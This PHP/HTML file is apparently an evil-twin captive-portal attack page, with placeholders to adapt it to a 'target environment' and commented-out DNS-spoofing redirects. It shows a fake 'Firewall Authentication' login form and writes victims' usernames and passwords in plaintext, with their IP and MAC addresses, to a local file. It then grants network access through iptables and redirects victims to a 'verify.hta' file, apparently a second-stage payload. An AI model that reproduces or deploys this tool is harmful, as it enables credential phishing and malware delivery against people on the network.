<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN">

<style type="text/css">html,body{height:100%;padding:0;margin:0;}.oc{display:table;width:100%;height:100%;}.ic{display:table-cell;vertical-align:middle;height:100%;}form{display:block;background:#ccc;border:2px solid red;padding:0 0 25px 0;width:500px;font-family:helvetica,sans-serif;font-size:14px;margin:10px auto;}.fel,.fer,.fec{text-align:center;width:350px;margin:0 auto;padding:10px;}.fel{text-align:left;}.fer{text-align:right;}h1{font-weight:bold;font-size:21px;margin:0;padding:20px 10px;text-align:center;}p{margin:15px auto;width:75%;text-align:left;}ul{margin:15px auto;width:75%;}h2{margin:25px 10px;font-weight:bold;text-align:center;}label,h2{font-size:16px;}.logo{background:#eee center 25px url(images/MGPGHGPGPFGGHHPFBGFHEHIG) no-repeat;padding-top:80px;}</style>

<?php
// Place in the root of the webserver directory

// Rename these Variables to conform with the target environment 
$server_name = "SERVER_NAME_REPLACE";
$domain_name = "DOMAIN_NAME_REPLACE";
$site_name = "SITE_NAME_REPLACE";
 
// Path to the arp command on the local server
$arp = "/usr/sbin/arp";
 
// The following file is used to keep track of users
$users = "/var/lib/users";
 
// Check if we've been redirected by firewall to here.
// If so redirect to registration address
// Comment out to test ------->
//DNSSPOOF if ($_SERVER['SERVER_NAME']!="$server_name.$domain_name") {
//DNSSPOOF   header("location:http://$server_name.$domain_name/index.php?add="
//DNSSPOOF     .urlencode($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']));
//DNSSPOOF   exit;
//DNSSPOOF }
// <---------
 
// Attempt to get the client's mac address
$mac = shell_exec("$arp -a ".$_SERVER['REMOTE_ADDR']);
preg_match('/..:..:..:..:..:../',$mac , $matches);
@$mac = $matches[0];
if (!isset($mac)) { exit; }
 
$user = $_POST['user'];
 
if (empty($user)) {
//if ($code!="1234") {
  // code doesn’t equal expected value, so display form
  ?>

<div class="oc"><div class="ic">

  <form method='POST'>
<h1 class="logo">Authentication Required</h1>
<h2>Please enter your username and password to continue.</h2>
<div class="fer">
<label for="ft_un">Username:</label> 
<input type='text' name='user' style="width:245px"><br></div>
<div class="fer">
<label for="ft_pd">Password:</label> 
<input type='password' name='pass' autocomplete="off" style="width:245px"></div>
<div class="fer"><input type='submit' name='submit' value='Continue'></div>
  </form>
</div></div>

  <?php
} else {
    enable_address();
}
 
// This function enables the PC on the system by calling iptables, and also saving the
// details in the users file for next time the firewall is reset
 
function enable_address() {
    global $user;
    global $pass;
    global $mac;
    global $users;
    file_put_contents($users,$_POST['user']."\t".$_POST['pass']."\t".$_SERVER['REMOTE_ADDR']."\t$mac\t".date("m.d.Y")."\n",FILE_APPEND + LOCK_EX);
    // Add PC to the firewall
    exec("sudo iptables -I internet 1 -t nat -m mac --mac-source $mac -j RETURN");
    // The following line removes connection tracking for the PC
    // This clears any previous (incorrect) route info for the redirection
    exec("sudo rmtrack ".$_SERVER['REMOTE_ADDR']);
ob_start();
header("Location: verify.hta");
exit;
//    sleep(1);
//    header("location:http://".$_GET['add']);
//    exit;
}

// Function to print page header
function print_header() {

  ?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Firewall Authentication</title>
</head>
 <body>
  <?php
}

// Function to print page footer
function print_footer() {
  echo "</body>";
  echo "</html>";

}

?>

